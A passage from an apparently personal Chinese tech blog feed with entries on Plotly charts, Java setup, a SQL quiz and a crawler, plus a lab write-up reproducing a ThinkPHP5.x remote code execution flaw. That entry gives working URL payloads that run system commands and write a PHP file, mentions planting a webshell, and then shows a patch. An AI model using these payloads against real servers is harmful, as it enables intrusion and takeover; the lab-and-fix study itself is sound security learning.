class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">from plotly.graph_objs import Bar</span><br><span class="line">from plotly import offline</span><br><span class="line"></span><br><span class="line">#执行API调用并存储响应</span><br><span class="line">url &#x3D; &#39;https:&#x2F;&#x2F;api.github.com&#x2F;search&#x2F;repositories?q&#x3D;language:python&amp;sort&#x3D;stars&#39;</span><br><span class="line">headers &#x3D; &#123;&#39;Accept&#39;:&#39;application&#x2F;vnd.github.v3+json&#39;&#125;</span><br><span class="line">r &#x3D; requests.get(url,headers&#x3D;headers)</span><br><span class="line">print(f&quot;Status code: &#123;r.status_code&#125;&quot;)</span><br><span class="line">response_dict &#x3D; r.json()</span><br><span class="line">repo_dicts &#x3D; response_dict[&#39;items&#39;]</span><br><span class="line">repo_links, stars, labels &#x3D; [], [], []</span><br><span class="line">for repo_dict in repo_dicts:</span><br><span class="line">    repo_name &#x3D; repo_dict[&#39;name&#39;]</span><br><span class="line">    repo_url &#x3D; repo_dict[&#39;html_url&#39;]</span><br><span class="line">    repo_link &#x3D; f&quot;&lt;a href&#x3D;&#39;&#123;repo_url&#125;&#39;&gt;&#123;repo_name&#125;&lt;&#x2F;a&gt;&quot;</span><br><span class="line">    repo_links.append(repo_link)</span><br><span class="line">    stars.append(repo_dict[&#39;stargazers_count&#39;])</span><br><span class="line"></span><br><span class="line">    owner &#x3D; repo_dict[&#39;owner&#39;][&#39;login&#39;]</span><br><span class="line">    description &#x3D; repo_dict[&#39;description&#39;]</span><br><span class="line">    label &#x3D; f&quot;&#123;owner&#125;&lt;br &#x2F;&gt;&#123;description&#125;&quot;</span><br><span class="line">    labels.append(label)</span><br><span class="line"></span><br><span class="line">#可视化</span><br><span class="line">data &#x3D; [&#123;</span><br><span class="line">    &#39;type&#39;: &#39;bar&#39;,</span><br><span class="line">    &#39;x&#39;: repo_links,</span><br><span class="line">    &#39;y&#39;:stars,</span><br><span class="line">    &#39;hovertext&#39;: labels,</span><br><span class="line">    &#39;marker&#39;: &#123;</span><br><span class="line">        &#39;color&#39;: &#39;rgb(60, 100, 150)&#39;,</span><br><span class="line">        &#39;line&#39;: &#123;&#39;width&#39;: 1.5, &#39;color&#39;: &#39;rgb(25,25,25)&#39;&#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    &#39;opacity&#39;: 0.6  #CSS opacity 属性 如设置 div 元素的不透明级别，这里设置了条形的不透明度为0.6，以免图表过于惹眼。</span><br><span class="line">&#125;]</span><br><span class="line">my_layout &#x3D; &#123;</span><br><span class="line">    &#39;title&#39;: &#39;Github上最受欢迎的Python项目&#39;,</span><br><span class="line">    &#39;titlefont&#39;: &#123;&#39;size&#39;: 28&#125;,</span><br><span class="line">    &#39;xaxis&#39;:&#123;</span><br><span class="line">        &#39;title&#39;: &#39;Repository&#39;,</span><br><span class="line">        &#39;titlefont&#39;: &#123;&#39;size&#39;: 24&#125;,</span><br><span class="line">        &#39;tickfont&#39;: &#123;&#39;size&#39;: 14&#125;,</span><br><span class="line"></span><br><span class="line">             &#125;,</span><br><span class="line">    &#39;yaxis&#39;:&#123;</span><br><span class="line">        &#39;title&#39;:&#39;Stars&#39;,</span><br><span class="line">        &#39;titlefont&#39;: &#123;&#39;size&#39;: 24&#125;,</span><br><span class="line">        &#39;tickfont&#39;: &#123;&#39;size&#39;: 14&#125;,</span><br><span class="line">    &#125;,</span><br><span class="line">&#125;</span><br><span class="line">fig &#x3D; &#123;&#39;data&#39;: data, &#39;layout&#39;:my_layout&#125;</span><br><span class="line">offline.plot(fig, filename&#x3D;&#39;python_repos.html&#39;)</span><br></pre></td></tr></table></figure><p><img src="/2021/07/19/python/python-visual/image-20210720101944206.png" alt="image-20210720101944206"></p><p><img src="/2021/07/19/python/python-visual/image-20210720102734849.png" alt="image-20210720102734849"></p><p>至此，我们对API获取的数据生成了可视化图表，它是交互性的，包含丰富的信息。</p><p>​                                                                        ——以上代码和部分内容来源于《Python编程 从入门到实践》</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;​    使用Plotly可视化仓库&lt;/p&gt;
&lt;p&gt;​    创建了可视化python图表，以html形式呈现&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/2021/07/19/python/python-visual/image-20210719204819823.png&quot; al</summary>
      
    
    
    
    
    <category term="python" scheme="http://daweitech.github.io/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>ThiThinkPHP5.x 远程函数执行与sql注入</title>
    <link href="http://daweitech.github.io/2021/07/18/src/ThinkPHP5/"/>
    <id>http://daweitech.github.io/2021/07/18/src/ThinkPHP5/</id>
    <published>2021-07-18T01:40:36.000Z</published>
    <updated>2021-07-18T11:32:12.557Z</updated>
    
    <content type="html"><![CDATA[<p>实验地址：<a href="https://www.anquanlong.com/lab_detail?lab_id=4&lib=5">ThinkPHP5.x 远程函数执行与sql注入_安全龙-专注做企业网络安全服务与网络安全培训! (anquanlong.com)</a></p><p>知识梳理：</p><p><strong>PoC</strong>，全称“Proof of Concept”，中文“概念验证”，常指一段漏洞证明的代码。</p><p><strong>Exp</strong>，全称“Exploit”，中文“利用”，指利用系统漏洞进行攻击的动作。</p><p><strong>Payload</strong>，中文“有效载荷”，指成功 exploit 之后，真正在目标系统执行的代码或指令。</p><p><strong>Shellcode</strong>，简单翻译“shell 代码”，是 Payload 的一种，由于其建立正向/反向 shell 而得名。</p><p>（用蚁剑连上之后，发现这是安全龙部署在阿里云上的环境）</p><p><img src="/2021/07/18/src/ThinkPHP5/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(280).png"></p><p>​    首先尝试了远程函数漏洞的初始语句：</p><p><code>?s=index/\think\app/invokefunction&amp;function=system&amp;return_value=&amp;command=</code></p><p><code>可执行Linux命令</code></p><p><img src="/2021/07/18/src/ThinkPHP5/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(281).png"></p><p>然后我们按照提示去写入一个文件，phpinfo的功能</p><p>利用到了file_put_contents函数（POC分析）</p><p><code>?s=index/think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=file_put_contents&amp;vars[1][]=./test.php&amp;vars[1][]=&lt;?php%20phpinfo();?&gt;</code></p><p><img src="/2021/07/18/src/ThinkPHP5/image-20210718191745523.png" alt="image-20210718191745523"></p><p>回显出了数字18，表示我们写入文件成功</p><p>接着进行访问</p><p>test.php</p><p><img src="/2021/07/18/src/ThinkPHP5/image-20210718191940910.png" alt="image-20210718191940910"></p><p>出现如上页面，成功利用漏洞。</p><p>接着我还尝试了一句话木马的写入，答案显然，也是可以写入并利用的。</p><p>最后蚁剑连接即可。</p><p><img src="/2021/07/18/src/ThinkPHP5/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(284).png"></p><p><img src="/2021/07/18/src/ThinkPHP5/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(285).png"></p><p><img src="/2021/07/18/src/ThinkPHP5/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(286).png"></p><p><img src="/2021/07/18/src/ThinkPHP5/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(287).png"></p><p>利用完漏洞，对于我们来说最重要的学会去修复</p><p>接下来学习修复这个漏洞</p><p>1.添加一段代码到App.php的554行</p><p><code>if (!preg_match(&#39;/^[A-Za-z](\w)*$/&#39;, $controller)) &#123;</code></p><p><code>            throw new HttpException(404, &#39;controller not exists:&#39; . $controller);</code></p><p><code>        &#125;</code></p><p><img src="/2021/07/18/src/ThinkPHP5/image-20210718193014082.png" alt="image-20210718193014082"></p><p>修改之后，使用原来的poc发现失效了</p><p>漏洞修复成功。</p><p><img src="/2021/07/18/src/ThinkPHP5/image-20210718193101116.png" alt="image-20210718193101116"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;实验地址：&lt;a href=&quot;https://www.anquanlong.com/lab_detail?lab_id=4&amp;lib=5&quot;&gt;ThinkPHP5.x 远程函数执行与sql注入_安全龙-专注做企业网络安全服务与网络安全培训! (anquanlong.com)&lt;/a&gt;</summary>
      
    
    
    
    
    <category term="漏洞复现" scheme="http://daweitech.github.io/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
  </entry>
  
  <entry>
    <title>java学习记录</title>
    <link href="http://daweitech.github.io/2021/07/09/java/java1/"/>
    <id>http://daweitech.github.io/2021/07/09/java/java1/</id>
    <published>2021-07-09T02:08:51.000Z</published>
    <updated>2021-07-09T23:03:41.977Z</updated>
    
    <content type="html"><![CDATA[<h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p> 尝试了好几种编程软件，发生了不同程度报错</p><p>pycharm：连接debugger失败</p><p>sublintext：扩展较mafan</p><p>eclipse：届时应该会用</p><p>最终敲定在假期使用vscode来编程java</p><h4 id="7-9"><a href="#7-9" class="headerlink" title="7.9"></a>7.9</h4><p>经过昨天的多次失败，今天成功运行了Java，打印出了helloworld</p><p>总结一下：<strong>文件名需与类名一致</strong></p><p>使用了两个命令 <strong>javac</strong> 和 <strong>java</strong>。</p><p>执行前先用Javac编译，注意要带上后缀。</p><p><img src="/2021/07/09/java/java1/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(269).png" alt="屏幕截图(269)"></p><p><img src="/2021/07/09/java/java1/662E827A-FA32-4464-B0BD-40087F429E98.jpg" alt="img"></p><h5 id="菜鸟教程上的基本语法："><a href="#菜鸟教程上的基本语法：" class="headerlink" title="菜鸟教程上的基本语法："></a>菜鸟教程上的基本语法：</h5><ul><li><strong>大小写敏感</strong>：Java 是大小写敏感的，这就意味着标识符 Hello 与 hello 是不同的。</li><li><strong>类名</strong>：对于所有的类来说，类名的首字母应该大写。如果类名由若干单词组成，那么每个单词的首字母应该大写，例如 <strong>MyFirstJavaClass</strong> 。</li><li><strong>方法名</strong>：所有的方法名都应该以小写字母开头。如果方法名含有若干单词，则后面的每个单词首字母大写。</li><li><strong>源文件名</strong>：源文件名必须和类名相同。当保存文件的时候，你应该使用类名作为文件名保存（切记 Java 是大小写敏感的），文件名的后缀为 <strong>.java</strong>。（如果文件名和类名不相同则会导致编译错误）。</li><li><strong>主方法入口</strong>：所有的 Java 程序由 <strong>public static void main(String[] args)</strong> 方法开始执行。</li></ul><p>突然发现之前无意中看到的vsdebugger有bug是真的，啊这</p><p>调试半天都不行，还是直接cmd命令行更快。乌鱼子。。</p><h4 id="7-10"><a href="#7-10" class="headerlink" title="7.10"></a>7.10</h4><p>清晨起来试了一下，很快嗷（doge）</p><p>切换vscode里的断点，误打误撞成功了，直接可以编译运行Java文件，好耶</p><p><img src="/2021/07/09/java/java1/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(271).png"></p><p><img src="/2021/07/09/java/java1/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(273).png" alt="屏幕截图(273)"></p><p><img src="/2021/07/09/java/java1/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(272).png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h4&gt;&lt;p&gt; 尝试了好几种编程软件，发生了不同程度报错&lt;/p&gt;
&lt;p&gt;pycharm：连接debugger失败&lt;/p&gt;
&lt;p&gt;sublintext：扩展</summary>
      
    
    
    
    
    <category term="java" scheme="http://daweitech.github.io/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>sql测试</title>
    <link href="http://daweitech.github.io/2021/05/31/sql/sql%E6%B5%8B%E8%AF%95/"/>
    <id>http://daweitech.github.io/2021/05/31/sql/sql%E6%B5%8B%E8%AF%95/</id>
    <published>2021-05-31T13:08:09.000Z</published>
    <updated>2021-08-25T01:53:33.826Z</updated>
    
    <content type="html"><![CDATA[<table><thead><tr><th>SQL 测验</th><th>结果:14/6</th></tr></thead><tbody><tr><td></td><td></td></tr></tbody></table><p><strong>1. SQL 指的是？</strong></p><p><strong>你的回答:</strong> Structured Query Language</p><p> 回答正确!</p><hr><p><strong>2. 哪个 SQL 语句用于从数据库中提取数据？</strong></p><p><strong>你的回答:</strong> GET</p><p> 回答错误!</p><p> 正确答案：SELECT</p><hr><p><strong>3. 哪条 SQL 语句用于更新数据库中的数据？</strong></p><p><strong>你的回答:</strong> UPDATE</p><p> 回答正确!</p><hr><p><strong>4. 哪条 SQL 语句用于删除数据库中的数据？</strong></p><p><strong>你的回答:</strong> DELETE</p><p> 回答正确!</p><hr><p><strong>5. 哪条 SQL 语句用于在数据库中插入新的数据？</strong></p><p><strong>你的回答:</strong> INSERT INTO</p><p> 回答正确!</p><hr><p><strong>6. 通过 SQL，您如何从 “Persons” 表中选取 “FirstName” 列？</strong></p><p><strong>你的回答:</strong> SELECT FirstName FROM Persons</p><p> 回答正确!</p><hr><p><strong>7. 通过 SQL，您如何从 “Persons” 表中选取所有的列？</strong></p><p><strong>你的回答:</strong> SELECT * FROM Persons</p><p> 回答正确!</p><hr><p><strong>8. 通过 SQL，您如何从 “Persons” 表中选取 “FirstName” 列的值等于”Peter” 的所有记录？</strong></p><p><strong>你的回答:</strong> SELECT * FROM Persons WHERE FirstName=’Peter’</p><p> 回答正确!</p><hr><p><strong>9. 通过 SQL，您如何从 “Persons” 表中选取 “FirstName” 列的值以 “a” 开头的所有记录？</strong></p><p><strong>你的回答:</strong> SELECT * FROM Persons WHERE FirstName=’a’</p><p> 回答错误!</p><p> 正确答案：SELECT * FROM Persons WHERE FirstName LIKE ‘a%’</p><hr><p><strong>10. 请判断下列说法是否正确：当所列出的某个条件为 true 时，OR 运算符会显示记录。当列出的所有条件为 true 时，AND 运算符会显示记录。</strong></p><p><strong>你的回答:</strong> 正确</p><p> 回答正确!</p><hr><p><strong>11. 通过 SQL，您如何在表 Persons 中选择 FirstName 等于 Thomas 而 LastName 等于 Carter 的所有记录？</strong></p><p><strong>你的回答:</strong> SELECT * FROM Persons WHERE FirstName LIKE ‘Thomas’ AND LastName LIKE ‘Carter’</p><p> 回答错误!</p><p> 正确答案：SELECT * FROM Persons WHERE FirstName=’Thomas’ AND LastName=’Carter’</p><hr><p><strong>12. 通过 SQL，您如何按字母顺序选取 Persons 表中 LastName 介于 Adams 和 Carter 的所有记录？</strong></p><p><strong>你的回答:</strong> SELECT * FROM Persons WHERE LastName BETWEEN ‘Adams’ AND ‘Carter’</p><p> 回答正确!</p><hr><p><strong>13. 哪条 SQL 语句可返回唯一不同的值？</strong></p><p><strong>你的回答:</strong> SELECT UNIQUE</p><p> 回答错误!</p><p> 正确答案：SELECT DISTINCT</p><hr><p><strong>14. 哪个 SQL 关键词用于对结果集进行排序？</strong></p><p><strong>你的回答:</strong> ORDER BY</p><p> 回答正确!</p><hr><p><strong>15. 通过 SQL，您如何根据 “FirstName” 列降序地从 “Persons” 表返回所有记录？</strong></p><p><strong>你的回答:</strong> SELECT * FROM Persons ORDER BY FirstName DESC</p><p> 回答正确!</p><hr><p><strong>16. 通过 SQL，您如何向 “Persons” 表插入新的记录？</strong></p><p><strong>你的回答:</strong> INSERT INTO Persons VALUES (‘Jimmy’, ‘Jackson’)</p><p> 回答正确!</p><hr><p><strong>17. 通过 SQL，您如何向 “Persons” 表中的 “LastName” 列插入 “Wilson” ？</strong></p><p><strong>你的回答:</strong> INSERT INTO Persons (LastName) VALUES (‘Wilson’)</p><p> 回答正确!</p><hr><p><strong>18. 您如何把 “Persons” 表中 “LastName” 列的 “Gates” 改为 “Wilson” ？</strong></p><p><strong>你的回答:</strong> MODIFY Persons SET LastName=’Wilson’ WHERE LastName=’Gates’</p><p> 回答错误!</p><p> 正确答案：UPDATE Persons SET LastName=’Wilson’ WHERE LastName=’Gates’</p><hr><p><strong>19. 通过 SQL，您如何在 “Persons” 表中删除 “FirstName” 等于 “Fred” 的纪录？</strong></p><p><strong>你的回答:</strong> DELETE FROM Persons WHERE FirstName = ‘Fred’</p><p> 回答正确!</p><hr><p><strong>20. 通过 SQL，您如何返回 “Persons” 表中记录的数目？</strong></p><p><strong>你的回答:</strong> SELECT COUNT() FROM Persons</p><p> 回答错误!</p><p> 正确答案：SELECT COUNT(*) FROM Persons</p>]]></content>
    
    
      
      
    <summary type="html">&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;SQL 测验&lt;/th&gt;
&lt;th&gt;结果:14/6&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;&lt;tr&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;&lt;/table&gt;
&lt;p&gt;&lt;strong&gt;1. SQ</summary>
      
    
    
    
    
    <category term="sql" scheme="http://daweitech.github.io/tags/sql/"/>
    
  </entry>
  
  <entry>
    <title>爬虫</title>
    <link href="http://daweitech.github.io/2021/05/19/python/%E7%88%AC%E8%99%AB/"/>
    <id>http://daweitech.github.io/2021/05/19/python/%E7%88%AC%E8%99%AB/</id>
    <published>2021-05-19T12:47:42.000Z</published>
    <updated>2021-05-19T12:52:10.082Z</updated>
    
    <content type="html"><![CDATA[<p> 今天终于是成功做到了python爬虫</p><p>之前的失败</p><p>总结了一下太想当然直接搬人家代码</p><p>所以有些库没安装都不认真看</p><p>小小开心一下，嘿嘿</p><p><img src="/2021/05/19/python/%E7%88%AC%E8%99%AB/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(214).png"></p><p><img src="/2021/05/19/python/%E7%88%AC%E8%99%AB/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(215).png"></p><p><img src="/2021/05/19/python/%E7%88%AC%E8%99%AB/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(216).png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt; 今天终于是成功做到了python爬虫&lt;/p&gt;
&lt;p&gt;之前的失败&lt;/p&gt;
&lt;p&gt;总结了一下太想当然直接搬人家代码&lt;/p&gt;
&lt;p&gt;所以有些库没安装都不认真看&lt;/p&gt;
&lt;p&gt;小小开心一下，嘿嘿&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/2021/05/19/python/%E7%88</summary>
      
    
    
    
    
    <category term="python" scheme="http://daweitech.github.io/tags/python/"/>
    
  </entry>
  
</feed>
